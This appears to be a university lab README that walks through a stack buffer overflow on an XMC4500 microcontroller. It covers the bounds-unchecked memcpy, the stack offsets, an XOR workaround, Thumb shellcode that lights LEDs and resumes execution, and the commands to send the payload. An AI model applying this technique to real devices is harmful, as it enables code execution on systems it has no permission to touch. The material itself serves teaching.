# Part A: Stack Buffer Overflow Exploit

## Overview

This assignment demonstrates a **stack buffer overflow attack** on an embedded ARM Cortex-M4 device (XMC4500). The goal is to exploit a vulnerable encryption function to execute arbitrary code (shellcode) that turns on LEDs.

## Objective

Exploit the buffer overflow vulnerability in the `encrypt()` function to:
1. Overwrite the return address on the stack
2. Execute shellcode that configures and turns on LEDs at GPIO pins P1.0 and P1.1
3. Resume normal program execution without crashing

## The Vulnerability

### Location
File: `crypto.c`, function `encrypt()`

```c
uint8_t encrypt(uint8_t *ciphertext[],
                const uint8_t *plaintext, const size_t plaintext_len,
                const uint8_t *nonce, const uint8_t *key) {
    uint8_t buf[128];                          // Fixed-size buffer on stack
    memcpy(buf, plaintext, plaintext_len);     // NO BOUNDS CHECK! ⚠️
    for(uint8_t i=0; i<128; i++) buf[i] ^= key[nonce[0] % 8];
    // ... rest of function
}
```

### Why It's Vulnerable
- The buffer `buf` is **128 bytes** on the stack
- `memcpy` copies `plaintext_len` bytes **without checking** if it exceeds 128
- If we send more than 128 bytes, we overflow into saved registers and the return address
- By controlling the return address, we control where the CPU jumps after the function returns

## Stack Layout Analysis

### Extracting Stack Information

#### 1. Disassemble the `encrypt` function:
```bash
arm-none-eabi-objdump -d build/main.elf | grep -A 30 "<encrypt>"
```

**Key instructions:**
```asm
08000714 <encrypt>:
 8000714:   b570        push    {r4, r5, r6, lr}    # Save 4 registers (16 bytes)
 8000716:   b0a0        sub     sp, #128            # Allocate 128 bytes for buffer
```

#### 2. Stack Layout After Prologue:

```
Higher addresses
┌─────────────────────┐
│  [SP+140] = LR      │ ← Return address (TARGET!)
│  [SP+136] = r6      │ ← Saved r6
│  [SP+132] = r5      │ ← Saved r5
│  [SP+128] = r4      │ ← Saved r4
│  [SP+0 to SP+127]   │ ← buf[128] (vulnerable buffer)
└─────────────────────┘ ← SP after prologue
Lower addresses
```

**Padding calculation:** 128 (buffer) + 12 (r4, r5, r6) = **140 bytes** to reach LR

## Critical Addresses

### 1. Resume Address (Where to return after shellcode)

**How to find:**
```bash
arm-none-eabi-objdump -d build/main.elf | grep -B5 -A5 "bl.*encrypt"
```

**Output:**
```asm
8000320:   f000 f9f8   bl   8000714 <encrypt>
8000324:   2800        cmp  r0, #0              ← This is the resume address
```

**Resume address:** `0x08000324 + 1 (Thumb bit) = 0x08000325`

### 2. Stack Address (Where shellcode will be)

**Method 1: Static Calculation**
- Initial SP (from linker): `0x10000800`
- After `main` prologue: `0x10000800 - 12 - 44 = 0x100007C8`
- After `encrypt` prologue: `0x100007C8 - 16 - 128 = 0x10000738`
- **Stack address:** `0x10000738 + 1 (Thumb bit) = 0x10000739`

**Method 2: GDB Verification**
```bash
# Start GDB server
JLinkGDBServer -device XMC4500 -endian little -if SWD -speed 1000 &

# Connect and break at encrypt
arm-none-eabi-gdb build/main.elf
(gdb) target remote localhost:2331
(gdb) break encrypt
(gdb) continue
# Send exploit from another terminal
(gdb) print/x $sp
# Should show: 0x100007c8 (before prologue) or 0x10000738 (after)
```

### 3. GPIO Registers (For LED control)

**XMC4500 GPIO PORT1:**
- Base address: `0x48028100`
- IOCR0 (Pin configuration): Base + `0x10` = `0x48028110`
- OMR (Output modification): Base + `0x04` = `0x48028104`

**How to find:** Check XMC4500 datasheet or existing code in PartB

## The XOR Encryption Trap

⚠️ **CRITICAL: The encrypt() function XORs the buffer!**

```c
for(uint8_t i=0; i<128; i++) buf[i] ^= key[nonce[0] % 8];
```

**From main.c:**
```c
uint8_t key[8] = {0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42};
```

**Impact:**
- First 128 bytes of our payload are XORed with `0x42`
- Bytes 128-143 (saved registers + return address) are **NOT XORed**

**Solution:**
Pre-XOR our shellcode and padding with `0x42`:
```
(payload ^ 0x42) ^ 0x42 = payload  ✓
```

## Shellcode Design

### Target: Turn on LEDs at P1.0 and P1.1

**Assembly code (`shellcode.s`):**
```asm
.syntax unified
.thumb

movw r2, #0x8100        ; PORT1 base low
movt r2, #0x4802        ; PORT1 base high → r2 = 0x48028100

movw r1, #0x8080        ; IOCR config (push-pull output)
movt r1, #0x0000
str.w r1, [r2, #16]     ; Write to IOCR0

movs r1, #3             ; Set bits 0 and 1
str r1, [r2, #4]        ; Write to OMR → turn on LEDs

movw r3, #0x0325        ; Resume address low
movt r3, #0x0800        ; Resume address high
bx r3                   ; Jump back
```

**Binary representation:** 34 bytes

## Exploit Structure

```
┌────────────────────────────────────┐
│ Shellcode (34 bytes)               │ ← XORed with 0x42
├────────────────────────────────────┤
│ Padding (106 bytes of 'A')         │ ← XORed with 0x42
├────────────────────────────────────┤
│ Return Address (4 bytes)           │ ← NOT XORed
│ 0x10000739 (little-endian)         │ ← Points to shellcode
└────────────────────────────────────┘
Total: 144 bytes
```

## How to Proceed

### Step 1: Analyze the Binary
```bash
cd /home/htmos6/Downloads/SmashToStack/PartA
make
arm-none-eabi-objdump -S build/main.elf > analysis.txt
```

### Step 2: Find Addresses
```bash
# Find encrypt function
arm-none-eabi-objdump -d build/main.elf | grep -A 30 "<encrypt>"

# Find call to encrypt
arm-none-eabi-objdump -d build/main.elf | grep -B5 -A5 "bl.*encrypt"

# Check stack size
grep -E "Stack|stack" build/main.elf.map
```

### Step 3: Write Shellcode
1. Create `shellcode.s` with assembly code
2. Test assembly locally or reference working code

### Step 4: Build Exploit

**Option A: Python Script**
```bash
python3 create_exploit.py
```

**Option B: Shell Script (from assembly)**
```bash
./build_exploit.sh
```

### Step 5: Test with GDB
```bash
# Terminal 1: Start GDB server
JLinkGDBServer -device XMC4500 -endian little -if SWD -speed 1000

# Terminal 2: Debug
arm-none-eabi-gdb build/main.elf
(gdb) target remote localhost:2331
(gdb) monitor reset
(gdb) break encrypt
(gdb) continue

# Terminal 3: Send exploit
python3 sendExploit.py exploit --device /dev/ttyACM0
```

### Step 6: Deploy
```bash
# Reset board
echo -e "h\nloadfile build/main.hex\nr\ng\nq" | JLinkExe -device XMC4500 -if SWD -speed 1000 -autoconnect 1

# Send exploit
python3 sendExploit.py exploit --device /dev/ttyACM0

# Verify LEDs turn on
```

## Files Overview

- **`main.c`** - Main program with vulnerable crypto
- **`crypto.c`** - Contains the vulnerable `encrypt()` function
- **`sendExploit.py`** - Sends exploit over USB (provided)
- **`create_exploit.py`** - Generates exploit binary (you create)
- **`shellcode.s`** - Assembly source for shellcode (you create)
- **`build_exploit.sh`** - Builds exploit from assembly (you create)
- **`exploit`** - Final binary payload (144 bytes)

## Expected Results

✅ **Success indicators:**
1. LEDs at P1.0 and P1.1 turn ON
2. Board responds with encrypted data (doesn't crash)
3. Can send exploit multiple times successfully

❌ **Failure indicators:**
1. Device timeout
2. No LED activity
3. Board becomes unresponsive (needs reset)

## Troubleshooting

### LEDs don't turn on
- Check stack address calculation
- Verify shellcode is correct (disassemble it)
- Ensure pre-XOR is applied to first 128 bytes
- Use GDB to check actual SP value

### Device crashes
- Resume address might be wrong
- Check Thumb bit (+1) is added to addresses
- Verify return address is at correct offset (140)

### GDB can't connect
- Check if JLinkGDBServer is running
- Try: `killall JLinkGDBServer && sleep 1 && JLinkGDBServer ...`
- Verify device is connected: `ls /dev/ttyACM*`

## References

- XMC4500 Reference Manual (GPIO registers)
- ARM Thumb-2 Instruction Set Reference
- Buffer Overflow Basics: https://www.ssl.com/article/nq-vault-app-not-as-secure-as-advertised/

## Security Lesson

This demonstrates why:
- **Input validation is critical** - Always check buffer sizes
- **Stack canaries** are important - Would detect this overflow
- **NX/DEP** would prevent code execution from stack
- **ASLR** would randomize stack addresses
- Embedded systems often lack these protections for performance

---

**Assignment completed successfully when LEDs turn on!** 🎯💡
